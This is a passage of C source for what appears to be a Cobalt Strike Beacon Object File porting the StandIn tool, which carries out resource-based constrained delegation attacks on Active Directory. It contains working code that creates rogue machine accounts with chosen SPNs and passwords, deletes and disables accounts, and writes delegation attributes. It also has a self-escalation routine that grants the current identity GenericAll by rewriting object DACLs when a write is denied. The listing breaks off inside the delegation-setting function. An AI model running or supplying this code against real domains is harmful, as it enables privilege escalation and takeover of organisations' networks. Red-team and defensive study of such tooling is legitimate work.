#include <windows.h>
#include <winldap.h>
#include <winber.h>
#include <sddl.h>
#include <dsgetdc.h>
#include "beacon.h"
#include "bofdefs.h"

/* Minimal ANSI SEC_WINNT_AUTH_IDENTITY_A for ldap_bind_s(LDAP_AUTH_NEGOTIATE)
 * with explicit credentials. sspi.h needs SECURITY_WIN32 defined, so we declare
 * the 7-field layout ourselves to avoid the header dance. */
typedef struct {
    unsigned char* User;
    unsigned long  UserLength;
    unsigned char* Domain;
    unsigned long  DomainLength;
    unsigned char* Password;
    unsigned long  PasswordLength;
    unsigned long  Flags;
} SIN_AUTH_IDENTITY_A;
#define SIN_AUTH_IDENTITY_FLAG_ANSI 0x1

/*
 * StandIn BOF — Resource-Based Constrained Delegation (RBCD) primitives,
 * ported 1:1 from FuzzySecurity/StandIn (v1.4). Focused on the machine-account
 * operations:
 *
 *   make    : LDAP Add a computer object (objectClass=Computer, sAMAccountName,
 *             userAccountControl=4096, dnsHostName, SPNs, unicodePwd)
 *   disable : userAccountControl |= ACCOUNTDISABLE (0x2)
 *   delete  : subtree-delete the computer object
 *   sid     : write msDS-AllowedToActOnBehalfOfOtherIdentity
 *   remove  : clear msDS-AllowedToActOnBehalfOfOtherIdentity
 *
 * Modes are dispatched from go() via an int; all five take --computer and the
 * optional --domain/--user/--pass alternate-credential set.
 */

/* ---- buffered output (one BeaconOutput per operation) ---- */
#define OUTBUFSIZE 16384
static char* g_out    = (char*)1;
static int   g_outLen = 1;

static void bflush(void)
{
    if (g_out != NULL && g_out != (char*)1 && g_outLen > 0)
        BeaconOutput(CALLBACK_OUTPUT, g_out, g_outLen);
    g_outLen = 0;
    if (g_out != NULL && g_out != (char*)1)
        g_out[0] = '\0';
}

static void bprintf(const char* fmt, ...)
{
    va_list ap;
    int n, space;

    if (g_out == NULL || g_out == (char*)1) return;

    space = OUTBUFSIZE - g_outLen;
    if (space <= 1) { bflush(); space = OUTBUFSIZE; }

    va_start(ap, fmt);
    n = MSVCRT$vsnprintf(g_out + g_outLen, (size_t)space, fmt, ap);
    va_end(ap);

    /* vsnprintf returns -1 (old msvcrt) or >= space (C99) on truncation. */
    if (n < 0 || n >= space) {
        bflush();
        va_start(ap, fmt);
        n = MSVCRT$vsnprintf(g_out, OUTBUFSIZE, fmt, ap);
        va_end(ap);
        if (n < 0 || n >= OUTBUFSIZE) {
            g_outLen = OUTBUFSIZE - 1;
            g_out[g_outLen] = '\0';
            return;
        }
        g_outLen = n;
        return;
    }

    g_outLen += n;
}

/* ---- mode ids ---- */
#define MODE_MAKE    0
#define MODE_DISABLE 1
#define MODE_DELETE  2
#define MODE_SID     3
#define MODE_REMOVE  4
#define MODE_OBJECT  5
#define MODE_ACL     6
#define MODE_ENCREAD 7
#define MODE_ENCSET  8
#define MODE_RBCDREAD 9

#ifndef LDAP_CONTROL_TREE_DELETE_OID
#define LDAP_CONTROL_TREE_DELETE_OID "1.2.840.113556.1.4.805"
#endif

#ifndef LDAP_SERVER_SD_FLAGS_OID
#define LDAP_SERVER_SD_FLAGS_OID "1.2.840.113556.1.4.801"
#endif

static int  strtol_ascii(const char* s);
static void strcat_safe(char* dst, size_t dstSz, const char* src);
static void ParseDacl(const unsigned char* sd, int sdLen);

/* ---- domain context ---- */
static char g_dc[256];       /* DC hostname (no \\ prefix)   */
static char g_realm[256];    /* DNS realm, UPPERCASE         */
static char g_base[512];     /* defaultNamingContext         */
static char g_schemaBase[512];   /* schemaNamingContext       */
static char g_configBase[512];   /* configurationNamingContext*/
static LDAP* g_ld = NULL;

/* Resolve a domain controller + realm. domain may be NULL (current domain). */
static BOOL ResolveDomain(const char* domain)
{
    PDOMAIN_CONTROLLER_INFOA pdc = NULL;
    int i;

    g_dc[0]    = '\0';
    g_realm[0] = '\0';

    if (NETAPI32$DsGetDcNameA(NULL, domain, NULL, NULL, 0, &pdc) != ERROR_SUCCESS || !pdc)
        return FALSE;

    {
        const char* name = pdc->DomainControllerName;
        if (name && name[0] == '\\' && name[1] == '\\') name += 2;
        for (i = 0; name && name[i] && i < (int)sizeof(g_dc) - 1; i++) g_dc[i] = name[i];
        g_dc[i] = '\0';
    }

    {
        const char* dn = pdc->DomainName;   /* DNS name, e.g. redhook.local */
        for (i = 0; dn && dn[i] && i < (int)sizeof(g_realm) - 1; i++) {
            char c = dn[i];
            if (c >= 'a' && c <= 'z') c = c - 'a' + 'A';
            g_realm[i] = c;
        }
        g_realm[i] = '\0';
    }

    NETAPI32$NetApiBufferFree(pdc);
    return (g_dc[0] != '\0' && g_realm[0] != '\0');
}

/* Bind and enable signing+sealing (needed to write unicodePwd). */
static BOOL LdapConnect(const char* domain, const char* user, const char* pass, BOOL secure)
{
    ULONG rc;
    int   v = LDAP_VERSION3;

    g_ld = secure
        ? WLDAP32$ldap_sslinit(g_dc, 636, 1)
        : WLDAP32$ldap_init(g_dc, 389);
    if (!g_ld) return FALSE;

    if (WLDAP32$ldap_set_option(g_ld, LDAP_OPT_PROTOCOL_VERSION, &v) != LDAP_SUCCESS)
        return FALSE;

    /* Enable LDAP signing + sealing on the SSPI session. Required for
     * unicodePwd; harmless for the read/modify/delete ops. */
    {
        PVOID on = LDAP_OPT_ON;
        WLDAP32$ldap_set_option(g_ld, LDAP_OPT_SIGN,    &on);
        WLDAP32$ldap_set_option(g_ld, LDAP_OPT_ENCRYPT, &on);
    }

    if (user && user[0] && pass && pass[0]) {
        /* Alternate creds. ldap_bind_s(LDAP_AUTH_NEGOTIATE) takes a
         * SEC_WINNT_AUTH_IDENTITY* as `cred`, NOT a plaintext password string
         * (passing one yields 0x52 LDAP_LOCAL_ERROR). */
        SIN_AUTH_IDENTITY_A ident;
        const char* idDomain = (domain && domain[0]) ? domain : g_realm;

        ident.User           = (unsigned char*)user;
        ident.UserLength     = (unsigned long)MSVCRT$strlen(user);
        ident.Domain         = (unsigned char*)idDomain;
        ident.DomainLength   = (unsigned long)MSVCRT$strlen(idDomain);
        ident.Password       = (unsigned char*)pass;
        ident.PasswordLength = (unsigned long)MSVCRT$strlen(pass);
        ident.Flags          = SIN_AUTH_IDENTITY_FLAG_ANSI;

        rc = WLDAP32$ldap_bind_s(g_ld, NULL, (PCHAR)&ident, LDAP_AUTH_NEGOTIATE);
    } else {
        rc = WLDAP32$ldap_bind_s(g_ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    }

    if (rc != LDAP_SUCCESS) {
        bprintf("[!] LDAP bind failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        return FALSE;
    }

    return TRUE;
}

static void LdapDisconnect(void)
{
    if (g_ld) {
        WLDAP32$ldap_unbind_s(g_ld);
        g_ld = NULL;
    }
}

/* Read defaultNamingContext from rootDSE. */
static BOOL GetBaseDn(void)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR* vals      = NULL;
    PCHAR  attrs[]   = { "defaultNamingContext", NULL };
    ULONG  rc;

    rc = WLDAP32$ldap_search_s(g_ld, "", LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return FALSE;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        vals = WLDAP32$ldap_get_values(g_ld, e, "defaultNamingContext");
        if (vals && vals[0]) {
            int i = 0;
            for (; vals[0][i] && i < (int)sizeof(g_base) - 1; i++) g_base[i] = vals[0][i];
            g_base[i] = '\0';
        }
        if (vals) WLDAP32$ldap_value_free(vals);
    }

    WLDAP32$ldap_msgfree(res);
    return g_base[0] != '\0';
}

/* ---- rootDSE single-valued attribute read ---- */
static BOOL ReadRootDseAttr(const char* attr, char* out, int outSz)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR* vals      = NULL;
    PCHAR  attrs[]   = { (PCHAR)attr, NULL };
    ULONG  rc;

    out[0] = '\0';
    rc = WLDAP32$ldap_search_s(g_ld, "", LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return FALSE;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        vals = WLDAP32$ldap_get_values(g_ld, e, (PCHAR)attr);
        if (vals && vals[0]) {
            int i = 0;
            for (; vals[0][i] && i < outSz - 1; i++) out[i] = vals[0][i];
            out[i] = '\0';
        }
        if (vals) WLDAP32$ldap_value_free(vals);
    }
    WLDAP32$ldap_msgfree(res);
    return out[0] != '\0';
}

static void LoadSchemaConfigBases(void)
{
    g_schemaBase[0] = '\0';
    g_configBase[0] = '\0';
    ReadRootDseAttr("schemaNamingContext", g_schemaBase, sizeof(g_schemaBase));
    ReadRootDseAttr("configurationNamingContext", g_configBase, sizeof(g_configBase));
}

/* Resolve the current process identity to a binary SID (for self-escalation). */
static int GetCurrentSid(unsigned char* sid, int sidSz)
{
    char uname[256];
    DWORD unameLen = sizeof(uname);
    char domain[256];
    DWORD domainLen = sizeof(domain);
    DWORD sidLen = (DWORD)sidSz;
    SID_NAME_USE use;

    if (!ADVAPI32$GetUserNameA(uname, &unameLen)) return 0;
    if (!ADVAPI32$LookupAccountNameA(NULL, uname, (PSID)(void*)sid, &sidLen, domain, &domainLen, &use))
        return 0;
    return (int)sidLen;
}

static BOOL SidEquals(const unsigned char* a, int aLen, const unsigned char* b, int bLen)
{
    int i;
    if (aLen != bLen) return FALSE;
    for (i = 0; i < aLen; i++) if (a[i] != b[i]) return FALSE;
    return TRUE;
}

/* Read a security-descriptor attribute (ntSecurityDescriptor / nTSecurityDescriptor)
 * with owner|group|dacl via the SD_FLAGS control. */
static BOOL ReadSdAttr(const char* dn, const char* attr, unsigned char* buf, int bufSz, int* outLen)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR  attrs[]   = { (PCHAR)attr, NULL };
    ULONG  rc;
    BOOL   ok = FALSE;

    unsigned char flags[5] = { 0x30, 0x03, 0x02, 0x01, 0x07 };  /* OWNER|GROUP|DACL */
    struct berval ctlval = { sizeof(flags), (char*)flags };
    LDAPControl  ctl     = { LDAP_SERVER_SD_FLAGS_OID, ctlval, TRUE };
    PLDAPControl sctrls[] = { &ctl, NULL };

    *outLen = 0;
    rc = WLDAP32$ldap_search_ext_s(g_ld, dn, LDAP_SCOPE_BASE, "(objectClass=*)",
                                   attrs, 0, sctrls, NULL, NULL, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return FALSE;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        struct berval** sdvals = WLDAP32$ldap_get_values_len(g_ld, e, (PCHAR)attr);
        if (sdvals && sdvals[0] && sdvals[0]->bv_val && sdvals[0]->bv_len >= 20 &&
            sdvals[0]->bv_len <= (ULONG)bufSz) {
            MSVCRT$memcpy(buf, sdvals[0]->bv_val, sdvals[0]->bv_len);
            *outLen = (int)sdvals[0]->bv_len;
            ok = TRUE;
        }
        if (sdvals) WLDAP32$ldap_value_free_len(sdvals);
    }
    WLDAP32$ldap_msgfree(res);
    return ok;
}

/* TRUE if `sid` holds ALL of `rights` in a direct ALLOW ACE of the DACL. */
static BOOL DaclHasRights(const unsigned char* sd, int sdLen, const unsigned char* sid, int sidLen, DWORD rights)
{
    DWORD daclOff, aceCount;
    const unsigned char* ace;
    int i;

    if (sdLen < 20) return FALSE;
    daclOff = (DWORD)sd[16] | ((DWORD)sd[17] << 8) | ((DWORD)sd[18] << 16) | ((DWORD)sd[19] << 24);
    if (daclOff == 0 || daclOff + 8 > (DWORD)sdLen) return FALSE;

    ace = sd + daclOff + 8;
    aceCount = (WORD)(sd[daclOff + 4] | (sd[daclOff + 5] << 8));

    for (i = 0; i < (int)aceCount; i++) {
        BYTE aceType;
        WORD aceSize;
        DWORD mask;
        const unsigned char* sidPtr;

        if ((int)(ace - sd) + 8 > sdLen) break;
        aceType = ace[0];
        aceSize = (WORD)(ace[2] | (ace[3] << 8));
        if (aceSize < 8 || (int)(ace - sd) + aceSize > sdLen) break;

        if (aceType != 0) { ace += aceSize; continue; }  /* only plain ALLOW ACEs */

        sidPtr = ace + 8;
        if (sidPtr[0] == 1) {
            int sLen = 8 + 4 * sidPtr[1];
            mask = (DWORD)ace[4] | ((DWORD)ace[5] << 8) | ((DWORD)ace[6] << 16) | ((DWORD)ace[7] << 24);
            if (sLen == sidLen && SidEquals(sidPtr, sidLen, sid, sidLen) && (mask & rights) == rights)
                return TRUE;
        }
        ace += aceSize;
    }
    return FALSE;
}

/* If we hold WriteDacl/WriteOwner on `dn`, append a GenericAll ALLOW ACE for the
 * current identity to the explicit DACL. Used as a fallback when a write op
 * returns LDAP_INSUFFICIENT_RIGHTS. */
static BOOL EscalateSelf(const char* dn)
{
    unsigned char mySid[68];
    int  mySidLen;
    unsigned char sd[8192];
    int  sdLen = 0;

    mySidLen = GetCurrentSid(mySid, sizeof(mySid));
    if (mySidLen <= 0) return FALSE;

    /* Check the EFFECTIVE DACL (which resolves CREATOR OWNER -> actual owner SID)
     * for our WriteDacl/WriteOwner rights. */
    {
        unsigned char effSd[8192];
        int effLen = 0;
        if (!ReadSdAttr(dn, "ntSecurityDescriptor", effSd, sizeof(effSd), &effLen) || effLen < 20)
            return FALSE;
        if (!DaclHasRights(effSd, effLen, mySid, mySidLen, 0x40000 /*WRITE_DAC*/) &&
            !DaclHasRights(effSd, effLen, mySid, mySidLen, 0x80000 /*WRITE_OWNER*/))
            return FALSE;
    }

    /* Read the EXPLICIT (stored) SD, so we only rewrite what the object actually
     * holds (inherited ACEs come from the parent and must not be written back). */
    if (!ReadSdAttr(dn, "nTSecurityDescriptor", sd, sizeof(sd), &sdLen) || sdLen < 20)
        return FALSE;

    DWORD daclOff = (DWORD)sd[16] | ((DWORD)sd[17] << 8) | ((DWORD)sd[18] << 16) | ((DWORD)sd[19] << 24);
    if (daclOff == 0 || daclOff + 8 > (DWORD)sdLen) return FALSE;

    WORD oldAclSize   = (WORD)(sd[daclOff + 2] | (sd[daclOff + 3] << 8));
    WORD oldAceCount  = (WORD)(sd[daclOff + 4] | (sd[daclOff + 5] << 8));
    if (oldAclSize < 8 || daclOff + oldAclSize > (DWORD)sdLen) return FALSE;

    int aceSize    = 8 + mySidLen;         /* ACCESS_ALLOWED_ACE: 4 hdr + 4 mask + SID */
    int newAclSize = oldAclSize + aceSize;
    int sd2Size    = 20 + newAclSize;

    unsigned char sd2[20 + 8192 + 76];
    MSVCRT$memset(sd2, 0, sizeof(sd2));

    /* minimal self-relative SD carrying only the new DACL */
    sd2[0] = 0x01;
    sd2[2] = 0x04; sd2[3] = 0x80;          /* control = SE_DACL_PRESENT|SE_SELF_RELATIVE */
    sd2[16] = 0x14; sd2[17] = 0; sd2[18] = 0; sd2[19] = 0;   /* DACL offset = 20 */

    /* copy old ACL, refresh header */
    MSVCRT$memcpy(sd2 + 20, sd + daclOff, oldAclSize);
    sd2[20] = 0x04;                        /* ACL_REVISION_DS */
    sd2[22] = (unsigned char)(newAclSize & 0xFF);
    sd2[23] = (unsigned char)((newAclSize >> 8) & 0xFF);
    sd2[24] = (unsigned char)((oldAceCount + 1) & 0xFF);
    sd2[25] = (unsigned char)(((oldAceCount + 1) >> 8) & 0xFF);

    /* append ACCESS_ALLOWED_ACE: GenericAll (0x10000000) for current identity */
    {
        unsigned char* ace = sd2 + 20 + oldAclSize;
        ace[0] = 0x00;                     /* AceType = ACCESS_ALLOWED */
        ace[1] = 0x00;                     /* AceFlags */
        ace[2] = (unsigned char)(aceSize & 0xFF);
        ace[3] = (unsigned char)((aceSize >> 8) & 0xFF);
        ace[4] = 0x00; ace[5] = 0x00; ace[6] = 0x00; ace[7] = 0x10;  /* 0x10000000 LE */
        MSVCRT$memcpy(ace + 8, mySid, mySidLen);
    }

    struct berval bv;
    struct berval* bvals[] = { &bv, NULL };
    bv.bv_len = (ULONG)sd2Size;
    bv.bv_val = (PCHAR)sd2;

    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    mod.mod_type = "nTSecurityDescriptor";
    mod.mod_vals.modv_bvals = bvals;
    mods[0] = &mod;
    mods[1] = NULL;

    unsigned char flags[5] = { 0x30, 0x03, 0x02, 0x01, 0x04 };  /* DACL only */
    struct berval ctlval = { sizeof(flags), (char*)flags };
    LDAPControl ctl = { LDAP_SERVER_SD_FLAGS_OID, ctlval, TRUE };
    PLDAPControl sctrls[] = { &ctl, NULL };

    ULONG rc = WLDAP32$ldap_modify_ext_s(g_ld, dn, mods, sctrls, NULL);
    return (rc == LDAP_SUCCESS);
}

static ULONG ModifyWithEscalation(const char* dn, LDAPMod** mods)
{
    ULONG rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
    if (rc == LDAP_INSUFFICIENT_RIGHTS) {
        bprintf("[*] Insufficient rights - attempting DACL self-escalation (WriteDacl -> GenericAll)...\n");
        if (EscalateSelf(dn)) {
            bprintf("[+] Self-escalation succeeded (added GenericAll ACE for current identity).\n");
            rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
        } else {
            bprintf("[!] Self-escalation failed (current identity lacks WriteDacl/WriteOwner here).\n");
        }
    }
    return rc;
}

/* Build "\XX\XX..." from a 16-byte GUID for an LDAP filter. */
static void GuidToFilter(const unsigned char* guid, char* out, int outSz)
{
    int i, pos = 0;
    out[0] = '\0';
    for (i = 0; i < 16 && pos < outSz - 4; i++) {
        pos += MSVCRT$sprintf(out + pos, "\\%02X", guid[i]);
    }
}

/* Resolve a 16-byte GUID (schemaIDGUID or rightsGuid) to a friendly name. */
static BOOL ResolveGuidName(const unsigned char* guid, char* out, int outSz)
{
    char filt[64];
    char filter[128];
    char base[600];
    LDAPMessage* res = NULL;
    LDAPMessage* e = NULL;
    PCHAR* vals = NULL;
    ULONG rc;
    BOOL ok = FALSE;
    int i;

    out[0] = '\0';
    if (!g_schemaBase[0]) LoadSchemaConfigBases();

    GuidToFilter(guid, filt, sizeof(filt));

    /* 1) schema attribute: schemaIDGUID -> ldapDisplayName */
    if (g_schemaBase[0]) {
        PCHAR attrs[] = { "ldapDisplayName", NULL };
        MSVCRT$sprintf(filter, "(schemaIDGUID=%s)", filt);
        rc = WLDAP32$ldap_search_s(g_ld, g_schemaBase, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &res);
        if (rc == LDAP_SUCCESS && res) {
            e = WLDAP32$ldap_first_entry(g_ld, res);
            if (e) {
                vals = WLDAP32$ldap_get_values(g_ld, e, "ldapDisplayName");
                if (vals && vals[0]) {
                    for (i = 0; vals[0][i] && i < outSz - 1; i++) out[i] = vals[0][i];
                    out[i] = '\0';
                    ok = TRUE;
                }
                if (vals) WLDAP32$ldap_value_free(vals);
            }
            WLDAP32$ldap_msgfree(res);
            res = NULL;
            if (ok) return TRUE;
        }
        if (res) { WLDAP32$ldap_msgfree(res); res = NULL; }
    }

    /* 2) extended right: rightsGuid -> cn */
    if (g_configBase[0]) {
        PCHAR attrs2[] = { "cn", NULL };
        MSVCRT$sprintf(base, "CN=Extended-Rights,%s", g_configBase);
        MSVCRT$sprintf(filter, "(rightsGuid=%s)", filt);
        rc = WLDAP32$ldap_search_s(g_ld, base, LDAP_SCOPE_ONELEVEL, filter, attrs2, 0, &res);
        if (rc == LDAP_SUCCESS && res) {
            e = WLDAP32$ldap_first_entry(g_ld, res);
            if (e) {
                vals = WLDAP32$ldap_get_values(g_ld, e, "cn");
                if (vals && vals[0]) {
                    for (i = 0; vals[0][i] && i < outSz - 1; i++) out[i] = vals[0][i];
                    out[i] = '\0';
                    ok = TRUE;
                }
                if (vals) WLDAP32$ldap_value_free(vals);
            }
            WLDAP32$ldap_msgfree(res);
            res = NULL;
            if (ok) return TRUE;
        }
        if (res) WLDAP32$ldap_msgfree(res);
    }

    return FALSE;
}

/* Find an object by sam filter; returns its DN (caller frees with ldap_memfree). */
static PCHAR FindObjectDn(const char* samFilter)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR  attrs[]   = { "distinguishedName", NULL };
    PCHAR  dn        = NULL;
    ULONG  rc;

    rc = WLDAP32$ldap_search_s(g_ld, g_base, LDAP_SCOPE_SUBTREE, samFilter, attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return NULL;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e)
        dn = WLDAP32$ldap_get_dn(g_ld, e);

    WLDAP32$ldap_msgfree(res);
    return dn;
}

static int ReadUac(const char* dn)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR* vals      = NULL;
    PCHAR  attrs[]   = { "userAccountControl", NULL };
    int    uac       = -1;
    ULONG  rc;

    rc = WLDAP32$ldap_search_s(g_ld, dn, LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return -1;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        vals = WLDAP32$ldap_get_values(g_ld, e, "userAccountControl");
        if (vals && vals[0]) uac = (int)strtol_ascii(vals[0]);
        if (vals) WLDAP32$ldap_value_free(vals);
    }
    WLDAP32$ldap_msgfree(res);
    return uac;
}

/* tiny decimal string -> int (avoids a MSVCRT$strtol import) */
static int strtol_ascii(const char* s)
{
    int v = 0;
    while (*s >= '0' && *s <= '9') { v = v * 10 + (*s - '0'); s++; }
    return v;
}

/* 32-bit unsigned decimal parse (SID sub-authorities exceed INT_MAX). */
static unsigned long strtoul_ascii(const char* s)
{
    unsigned long v = 0;
    while (*s >= '0' && *s <= '9') { v = v * 10 + (unsigned long)(*s - '0'); s++; }
    return v;
}

/* Parse "S-1-5-21-a-b-c-rid" into a binary SID. Returns byte length, 0 on error. */
static int ParseSidString(const char* s, unsigned char* out, int outSz)
{
    unsigned long sub[16];
    unsigned long long auth;
    int nSub = 0, rev, i, len;
    const char* p;

    if (!s || s[0] != 'S' || s[1] != '-') return 0;
    p = s + 2;

    rev = (int)strtoul_ascii(p);
    while (*p >= '0' && *p <= '9') p++;
    if (*p != '-') return 0;
    p++;

    auth = strtoul_ascii(p);
    while (*p >= '0' && *p <= '9') p++;

    while (*p == '-') {
        p++;
        if (nSub >= 15) return 0;
        sub[nSub++] = strtoul_ascii(p);
        while (*p >= '0' && *p <= '9') p++;
    }
    if (*p != '\0') return 0;

    len = 8 + 4 * nSub;
    if (len > outSz) return 0;

    out[0] = (unsigned char)rev;
    out[1] = (unsigned char)nSub;
    for (i = 0; i < 6; i++)
        out[2 + i] = (unsigned char)((auth >> (8 * (5 - i))) & 0xFF);
    for (i = 0; i < nSub; i++) {
        out[8 + i*4 + 0] = (unsigned char)(sub[i] & 0xFF);
        out[8 + i*4 + 1] = (unsigned char)((sub[i] >> 8) & 0xFF);
        out[8 + i*4 + 2] = (unsigned char)((sub[i] >> 16) & 0xFF);
        out[8 + i*4 + 3] = (unsigned char)((sub[i] >> 24) & 0xFF);
    }
    return len;
}

/* ---- password generation (15-char [A-Za-z0-9]) ---- */
static void GenMachinePass(char* out, int len)
{
    static const char keyspace[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    unsigned char rnd[32];
    int i;
    ADVAPI32$SystemFunction036(rnd, sizeof(rnd));
    for (i = 0; i < len; i++)
        out[i] = keyspace[rnd[i % sizeof(rnd)] % (sizeof(keyspace) - 1)];
    out[len] = '\0';
}

/* ---- op: make machine account ---- */
static void OpMake(const char* computer)
{
    char pass[16];
    char dn[384];
    char dns[256];
    char spn1[256], spn2[256], spn3[256], spn4[256];
    char sam[128];
    char uac[16] = "4096";

    char    upwBytes[128];
    int     upwLen = 0;
    int     i;

    GenMachinePass(pass, 15);

    /* DN: CN=<name>,CN=Computers,DC=<realm parts> */
    {
        char* p = g_realm;
        MSVCRT$sprintf(dn, "CN=%s,CN=Computers", computer);
        /* realm is uppercase; split on '.' and append DC= parts */
        char tmp[256];
        int  ti = 0, ci;
        for (ci = 0; p[ci] != '\0'; ci++) {
            if (p[ci] == '.') {
                tmp[ti] = '\0';
                char part[64];
                MSVCRT$sprintf(part, ",DC=%s", tmp);
                strcat_safe(dn, sizeof(dn), part);
                ti = 0;
            } else {
                tmp[ti++] = p[ci];
            }
        }
        if (ti > 0) {
            tmp[ti] = '\0';
            char part[64];
            MSVCRT$sprintf(part, ",DC=%s", tmp);
            strcat_safe(dn, sizeof(dn), part);
        }
    }

    MSVCRT$sprintf(sam, "%s$", computer);
    MSVCRT$sprintf(dns, "%s.%s", computer, g_realm);
    MSVCRT$sprintf(spn1, "HOST/%s.%s", computer, g_realm);
    MSVCRT$sprintf(spn2, "RestrictedKrbHost/%s.%s", computer, g_realm);
    MSVCRT$sprintf(spn3, "HOST/%s", computer);
    MSVCRT$sprintf(spn4, "RestrictedKrbHost/%s", computer);

    /* unicodePwd = UTF-16LE of '"' + pass + '"' */
    {
        char q[64];
        MSVCRT$sprintf(q, "\"%s\"", pass);
        upwLen = MSVCRT$strlen(q) * 2;
        for (int j = 0; q[j]; j++) {
            upwBytes[j * 2]     = q[j];
            upwBytes[j * 2 + 1] = 0;
        }
    }

    bprintf("[?] Using DC   : %s\n", g_dc);
    bprintf("    |_ Domain  : %s\n", g_realm);
    bprintf("    |_ DN      : %s\n", dn);
    bprintf("    |_ Password: %s\n", pass);

    {
        char* ocVals[]  = { "Computer", NULL };
        char* samVals[] = { sam, NULL };
        char* uacVals[] = { uac, NULL };
        char* dnsVals[] = { dns, NULL };
        char* spnVals[] = { spn1, spn2, spn3, spn4, NULL };
        char* encVals[] = { "28", NULL };   /* 0x1C = RC4+AES128+AES256 */

        struct berval upwBv;
        struct berval* upwBvals[] = { &upwBv, NULL };
        upwBv.bv_len = (ULONG)upwLen;
        upwBv.bv_val = upwBytes;

        LDAPMod mods[8];
        LDAPMod* modArr[9];

        mods[0].mod_op = LDAP_MOD_ADD;
        mods[0].mod_type = "objectClass";
        mods[0].mod_vals.modv_strvals = ocVals;

        mods[1].mod_op = LDAP_MOD_ADD;
        mods[1].mod_type = "sAMAccountName";
        mods[1].mod_vals.modv_strvals = samVals;

        mods[2].mod_op = LDAP_MOD_ADD;
        mods[2].mod_type = "userAccountControl";
        mods[2].mod_vals.modv_strvals = uacVals;

        mods[3].mod_op = LDAP_MOD_ADD;
        mods[3].mod_type = "dNSHostName";
        mods[3].mod_vals.modv_strvals = dnsVals;

        mods[4].mod_op = LDAP_MOD_ADD;
        mods[4].mod_type = "servicePrincipalName";
        mods[4].mod_vals.modv_strvals = spnVals;

        mods[5].mod_op = LDAP_MOD_ADD | LDAP_MOD_BVALUES;
        mods[5].mod_type = "unicodePwd";
        mods[5].mod_vals.modv_bvals = upwBvals;

        mods[6].mod_op = LDAP_MOD_ADD;
        mods[6].mod_type = "msDS-SupportedEncryptionTypes";
        mods[6].mod_vals.modv_strvals = encVals;

        for (i = 0; i < 7; i++) modArr[i] = &mods[i];
        modArr[7] = NULL;

        ULONG rc = WLDAP32$ldap_add_s(g_ld, dn, modArr);

        if (rc != LDAP_SUCCESS) {
            bprintf("\n[!] Add with msDS-SupportedEncryptionTypes failed (0x%lx): %s - retrying without it\n", rc, WLDAP32$ldap_err2string(rc));
            for (i = 0; i < 6; i++) modArr[i] = &mods[i];
            modArr[6] = NULL;
            rc = WLDAP32$ldap_add_s(g_ld, dn, modArr);
        }
        if (rc == LDAP_SUCCESS)
            bprintf("\n[+] Machine account added to AD..\n");
        else
            bprintf("\n[!] Failed to add machine account to AD (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    }
}

/* ---- op: disable machine account ---- */
static void OpDisable(const char* computer)
{
    char filter[512];
    MSVCRT$sprintf(filter, "(samaccountname=%s$)", computer);

    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Host not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    int uac = ReadUac(dn);
    if (uac < 0) { bprintf("[!] Failed to read userAccountControl..\n"); WLDAP32$ldap_memfree(dn); return; }

    if (!(uac & 0x2)) {
        char newUac[16];
        MSVCRT$sprintf(newUac, "%d", uac | 0x2);
        char* vals[] = { newUac, NULL };
        LDAPMod mod;
        LDAPMod* mods[2];
        mod.mod_op = LDAP_MOD_REPLACE;
        mod.mod_type = "userAccountControl";
        mod.mod_vals.modv_strvals = vals;
        mods[0] = &mod;
        mods[1] = NULL;

        bprintf("[+] Machine account currently enabled\n");
        ULONG rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
        if (rc == LDAP_SUCCESS)
            bprintf("    |_ Account disabled..\n");
        else
            bprintf("[!] Failed to disable machine account (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    } else {
        bprintf("[+] Machine account already disabled\n");
        bprintf("    |_ Exiting..\n");
    }

    WLDAP32$ldap_memfree(dn);
}

/* ---- op: delete machine account (tree delete) ---- */
static void OpDelete(const char* computer)
{
    char filter[512];
    MSVCRT$sprintf(filter, "(samaccountname=%s$)", computer);

    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Host not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    struct berval bv = { 0, NULL };
    LDAPControl tc = { LDAP_CONTROL_TREE_DELETE_OID, bv, TRUE };
    PLDAPControl sctrls[] = { &tc, NULL };

    ULONG rc = WLDAP32$ldap_delete_ext_s(g_ld, dn, sctrls, NULL);
    if (rc == LDAP_SUCCESS)
        bprintf("[+] Machine account deleted from AD\n");
    else
        bprintf("[!] Failed to delete machine account (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));

    WLDAP32$ldap_memfree(dn);
}

/* ---- op: set msDS-AllowedToActOnBehalfOfOtherIdentity ---- */
static void OpSetRBCD(const char* computer, const char* sid)
{
    char filter[512];
    MSVCRT$sprintf(filter, "(samaccountname=%s$)", computer);

